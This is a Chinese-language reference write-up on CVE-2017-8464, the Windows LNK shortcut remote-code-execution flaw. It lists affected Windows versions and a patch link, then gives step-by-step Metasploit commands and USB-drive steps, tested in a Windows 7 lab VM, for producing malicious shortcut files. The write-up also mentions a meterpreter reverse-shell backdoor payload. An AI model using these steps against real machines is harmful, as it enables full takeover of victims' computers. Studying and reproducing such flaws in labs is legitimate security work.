### CVE-2017-8464

#### 描述

该漏洞的原理同2010年美国和以色列入侵并破坏伊朗核设施的震网行动中所使用的穿透核设施隔离网络的漏洞（CVE-2010-2568）非常类似，当存在漏洞的电脑被插上保存有漏洞文件的U盘时，不需要额外操作，漏洞攻击程序就可以执行并完全控制用户的电脑系统

#### 影响版本

| Product             | CPU Architecture | Version | Update | Tested |
| ------------------- | ---------------- | ------- | ------ | ------ |
| Windows 10          | x86/x64          |         |        |        |
| Windows 10          | x86/x64          | 1511    |        |        |
| Windows 10          | x86/x64          | 1607    |        |        |
| Windows 10          | x86/x64          | 1703    |        |        |
| Windows 7           | x86/x64          |         | SP1    |        |
| Windows 8.1         | x86/x64          |         |        |        |
| Windows Rt 8.1      |                  |         |        |        |
| Windows Server 2008 | x86/x64          |         | SP2    |        |
| Windows Server 2008 | x86/x64          | R2      | SP1    |        |
| Windows Server 2012 |                  |         |        |        |
| Windows Server 2012 |                  | R2      |        |        |
| Windows Server 2016 |                  |         |        |        |

#### 修复补丁

```
https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2017-8464
```

#### 利用方式

测试机器Windows 7 SP1 x64，直接用msf来利用

```
use exploits/windows/fileformat/cve_2017_8464_lnk_rce
set payload windows/x64/exec #要是x86使用windows/exec，还可以设置后门windows/x64/meterpreter/reverse_tcp
set cmd cmd.exe
set EXITFUNC thread
run
```

生成文件

![CVE-2017-8464_win7_x86_msf](https://github.com/Ascotbe/Random-img/blob/master/WindowsKernelExploits/CVE-2017-8464_win7_x86_msf.png?raw=true)

运行命令把它拷贝到test目录下

```
cp -r /root/.msf4/local/ /root/test
```

![CVE-2017-8464_win7_x86_msf2](https://github.com/Ascotbe/Random-img/blob/master/WindowsKernelExploits/CVE-2017-8464_win7_x86_msf2.png?raw=true)

接着把这些文件全部拷贝到U盘中，然后插上电脑即可

测试机器是虚拟机，所以需要打一个补丁**KB2533623**和装一个驱动**Intel(R)_USB_3.0_eXtensible_Host_Controller_Driver_5.0.4.43_v2**，然后USB设置为3.0，Windows7的补丁放在了这里

```
https://github.com/Ascotbe/WinKernelhub/tree/master/Patch
```

GIF图如下

![1](https://github.com/Ascotbe/Random-img/blob/master/WindowsKernelExploits/CVE-2017-8464_win7_x86.gif?raw=true)

